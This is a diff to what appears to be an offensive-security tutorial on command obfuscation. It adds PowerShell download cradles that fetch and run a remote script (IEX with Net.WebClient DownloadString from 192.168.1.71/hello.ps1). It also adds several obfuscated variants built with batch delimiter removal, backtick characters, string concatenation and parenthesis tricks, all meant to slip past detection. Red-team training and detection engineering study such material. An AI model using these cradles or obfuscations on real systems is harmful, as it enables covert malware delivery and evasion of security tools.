@@ -443,6 +443,19 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 ![pipe commands](http://i.cubeupload.com/McTrjq.jpg)
 
+      Using the delimiter remove technic into one cradle downloader (powershell) TODO:
+
+- String command to obfuscate<br />
+`cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`
+
+- String obfuscated<br />
+`cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"`
+
+![pipe commands](http://i.cubeupload.com/tv0oWc.jpg)
+
+- More obfuscated using carets special batch characters<br />
+
+![pipe commands](http://i.cubeupload.com/EhLChy.jpg)
 
 ---
 
@@ -707,6 +720,26 @@ The above string can be obfuscated using **powershell special characters:** **`*
       p`ow`ers`hell.e`xe $get -Class $sys           #<-- de-obfuscate syscall's at run-time
 
 ![powershell obfuscation](http://i63.tinypic.com/71pe0h.jpg)
+
+---
+
+      [ obfuscating .DownloadString ] In this article we allready have learned how to
+      use variable declarations + tick special characters to obfuscate the systemcall's.
+
+      $method = "D`ow`nlo`adSt`rin`g"
+      IEX (New-Object Net.WebClient).$method('http://192.168.1.71/hello.ps1')
+
+      This next example shows how to use 'parenthesis' to transform the DownloadString flag
+      into one powershell string that can be manipulated using more obfuscated technics ..
+
+- String command to obfuscate<br />
+`IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`
+
+- String obfuscated [Parenthesis+tick]<br />
+
+      I`EX ((N`ew-Obj`ect N`et.We`bCli`ent)).('Do'+'wn'+'lo'+'adStr'+'ing').Invoke(('h'+'tt'+'p:/'+'/19'+'2.16'+'8.1.71/hello.ps1'))
+
+![batch obfuscation](http://i.cubeupload.com/0CXBYp.jpg)
 
 ---
       Powershell also allow us to access windows environment variables using the $env: switch
